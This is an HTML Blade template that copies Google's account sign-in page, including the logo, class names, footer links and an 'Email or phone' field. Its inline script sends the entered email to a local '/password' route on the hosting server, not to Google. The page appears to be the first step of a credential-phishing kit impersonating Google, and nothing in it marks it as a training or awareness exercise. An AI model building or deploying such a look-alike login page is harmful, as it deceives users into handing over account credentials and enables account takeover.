<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
    <meta charset="utf-8" />
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="{{ asset('css/style.css') }}">
    <script>
        function handleNextClick() {
            var email = document.getElementById('identifierId').value;
            if (email) {
                window.location.href = '/password?email=' + encodeURIComponent(email);
            } else {
                // Optional: Handle case where email is not entered
                alert("Please enter your email or phone number.");
            }
        }
    </script>
</head>
<body class="jR8x9d nyoS7c fVfPj">

<div class="S7xv8 LZgQXe">
    <div class="TcuCfd NQ5OL">
        <div class="Ih3FE" aria-hidden="true">
            <div role="progressbar" class="sZwd7c B6Vhqe qdulke jK7moc">
                <div class="xcNBHc um3FLe"></div>
                <div class="w2zcLc Iq5ZMc"></div>
                <div class="MyvhI TKVRUb">
                    <span class="l3q5xe SQxu9c"></span>
                </div>
                <div class="MyvhI sUoeld">
                    <span class="l3q5xe SQxu9c"></span>
                </div>
            </div>
        </div>
        <div class="fAlnEc" id="yDmH0d">
            <div class="Svhjgc">
                <div class="zIgDIc">
                    <div class="Wf6lSd">
                        <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
                            <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
                            <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
                            <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
                            <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
                        </svg>
                    </div>
                    <div class="ObDc3 ZYOIke">
                        <h1 class="vAV9bf">Sign in</h1>
                        <div class="gNJDp">Use your Google Account</div>
                    </div>
                </div>
                <div class="UXFQgc">
                    <div class="qWK5J">
                        <div class="xKcayf">
                            <form method="post" novalidate="">
                                <section class="Em2Ord">
                                    <div class="yTaH4c">
                                        <div class="AFTWye vEQsqe">
                                            <div class="rFrNMe X3mtXb UOsO2 ToAxb zKHdkd sdJrJc">
                                                <div class="aCsJod oJeWuf">
                                                    <div class="aXBtI Wic03c">
                                                        <div class="Xb9hP">
                                                            <input type="email" class="whsOnd zHQkBf" autocomplete="username" spellcheck="false" tabindex="0" aria-label="Email or phone" name="identifier" id="identifierId" dir="ltr" />
                                                            <div class="AxOyFc snByac" aria-hidden="true">
                                                                Email or phone
                                                            </div>
                                                        </div>
                                                        <div class="i9lrp mIZh1c"></div>
                                                        <div class="OabDMe cXrdqd"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="dMNVAe"><button type="button">Forgot email?</button></div>
                                    </div>
                                </section>
                                <div class="RDsYTb">
                                    <div class="dMNVAe">
                                        Not your computer? Use Private Browse windows to sign in.
                                        <a href="https://support.google.com/accounts?p=signin_privateBrowse&hl=en" target="_blank">Learn more about using Guest mode</a>
                                    </div>
                                </div>
                                <div class="JYXaTc">
                                    <div class="O1Slxf">
                                        <div class="TNTaPb">
                                            <button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb" type="button" onclick="handleNextClick()">
                                                <span class="VfPpkd-vQzf8d">Next</span>
                                            </button>
                                        </div>
                                        <div class="FO2vFd">
                                            <div class="n3Clv">
                                                <button class="VfPpkd-LgbsSe ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb" type="button">
                                                    <span class="VfPpkd-vQzf8d">Create account</span>
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer class="wmGw4">
        <div class="FZfKCe">
            <div class="eXa0v">
                <div class="O1htCb-H9tDt">
                    <div class="VfPpkd-O1htCb VfPpkd-O1htCb-OWXEXe-INsAgc VfPpkd-O1htCb-OWXEXe-di8rgd-V67aGc ReCbLb UAQDDf dEoyBf">
                        <div class="VfPpkd-TkwUic" role="combobox" tabindex="0">
                                <span class="VfPpkd-NSFCdd-i5vt6e VfPpkd-NSFCdd-i5vt6e-OWXEXe-NSFCdd VfPpkd-NSFCdd-i5vt6e-OWXEXe-di8rgd-V67aGc">
                                    <span class="VfPpkd-NSFCdd-Brv4Fb"></span>
                                    <span class="VfPpkd-NSFCdd-MpmGFe"></span>
                                </span>
                            <span class="VfPpkd-uusGie-fmcmS-haAclf" aria-hidden="true">
                                    <span class="VfPpkd-uusGie-fmcmS">English (United States)</span>
                                </span>
                            <span class="VfPpkd-t08AT-Bz112c">
                                    <svg class="VfPpkd-t08AT-Bz112c-Bd00G" viewBox="7 10 10 5" focusable="false" aria-hidden="true">
                                        <polygon class="VfPpkd-t08AT-Bz112c-mt1Mkb" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10"></polygon>
                                        <polygon class="VfPpkd-t08AT-Bz112c-auswjd" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15"></polygon>
                                    </svg>
                                </span>
                        </div>
                    </div>
                </div>
            </div>
            <ul class="HwzH1e">
                <li class="qKvP1b"><a class="AVAq4d TrZEUc" href="https://support.google.com/accounts?hl=en&p=account_iph" target="_blank">Help</a></li>
                <li class="qKvP1b"><a class="AVAq4d TrZEUc" href="https://accounts.google.com/TOS?loc=GB&hl=en-US&privacy=true" target="_blank">Privacy</a></li>
                <li class="qKvP1b"><a class="AVAq4d TrZEUc" href="https://accounts.google.com/TOS?loc=GB&hl=en-US" target="_blank">Terms</a></li>
            </ul>
        </div>
    </footer>
</div>

</body>
</html>
